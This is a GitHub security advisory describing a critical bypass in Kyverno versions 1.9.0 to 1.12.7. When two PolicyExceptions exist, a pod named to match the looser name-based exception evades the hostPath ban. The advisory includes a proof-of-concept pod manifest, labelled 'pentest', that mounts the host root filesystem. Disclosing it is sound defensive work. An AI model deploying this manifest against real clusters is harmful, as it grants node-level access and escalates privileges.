# Bypassing Kyverno Policies via Double Policy Exceptions

**GHSA**: GHSA-gg4x-fgg2-h9w9 | **CVE**: N/A | **Severity**: critical (CVSS 9.1)

**CWE**: CWE-284

**Affected Packages**:
- **github.com/kyverno/kyverno** (go): >= 1.9.0, <= 1.12.7

## Description

### Summary
If a cluster has a `Kyverno` policy in enforce mode and there are two exceptions, this allows the policy to be bypassed, even if the first exception is more restrictive than the second.

### Details

The following policy was applied:

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-host-path
  annotations:
    policies.kyverno.io/title: Disallow hostPath
    policies.kyverno.io/category: Pod Security Standards (Baseline)
    policies.kyverno.io/severity: medium
    policies.kyverno.io/subject: Pod,Volume
    kyverno.io/kyverno-version: 1.6.0
    kyverno.io/kubernetes-version: "1.22-1.23"
    policies.kyverno.io/description: >-
      HostPath volumes let Pods use host directories and volumes in containers.
      Using host resources can be used to access shared data or escalate privileges
      and should not be allowed. This policy ensures no hostPath volumes are in use.
spec:
  validationFailureAction: Enforce
  background: true
  rules:
    - name: host-path
      match:
        any:
        - resources:
            kinds:
              - Pod
      validate:
        message: >-
          HostPath volumes are forbidden. The field spec.volumes[*].hostPath must be unset.
        pattern:
          spec:
            =(volumes):
              - X(hostPath): "null"
```

And two exceptions:

```yaml
apiVersion: kyverno.io/v2beta1
kind: PolicyException
metadata:
  name: disallow-host-path-exception
  namespace: kyverno
spec:
  exceptions:
  - policyName: disallow-host-path
    ruleNames:
    - host-path
  match:
    any:
    - resources:
        kinds:
        - DaemonSet
        - Deployment
        - Job
        - StatefulSet
        - ReplicaSet
        - ReplicationController
        - Pod
        - CronJob
        namespaces:
        - luntry
        - tstkyverno
        - examplens
```
```yaml
apiVersion: kyverno.io/v2beta1
kind: PolicyException
metadata:
  name: disallow-host-path-exception-names
  namespace: kyverno
spec:
  exceptions:
  - policyName: disallow-host-path
    ruleNames:
    - host-path
  match:
    any:
    - resources:
        kinds:
        - DaemonSet
        - Deployment
        - Job
        - StatefulSet
        - ReplicaSet
        - ReplicationController
        - Pod
        - CronJob
        names:
        - '*haproxy*'
        - '*ingress*'
```
Trying to apply such a yaml will result in the expected ban:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: mtkpi
  labels:
    app: pentest
spec:
  containers:
  - name: mtkpi
    image: ubuntu
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]  
  volumes:
  - name: noderoot
    hostPath:
      path: /
```
<img width="855" height="483" alt="Снимок экрана 2025-09-04 в 13 35 46" src="https://github.com/user-attachments/assets/deb28128-52fb-4f5f-a9bd-b68eefd411b2" />

However, if the load name is changed to satisfy the second exception, the restrictions can be bypassed:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: ingress
  labels:
    app: pentest
spec:
  containers:
  - name: mtkpi
    image: ubuntu
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]  
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

<img width="449" height="386" alt="Снимок экрана 2025-09-04 в 13 37 09" src="https://github.com/user-attachments/assets/8d5ad1e2-6d16-4768-8741-f11363bb9b22" />

It turns out that the second exception is higher in priority for Kyverno and allows for bypass of the restrictions.

### Impact
The security restrictions can be bypassed.
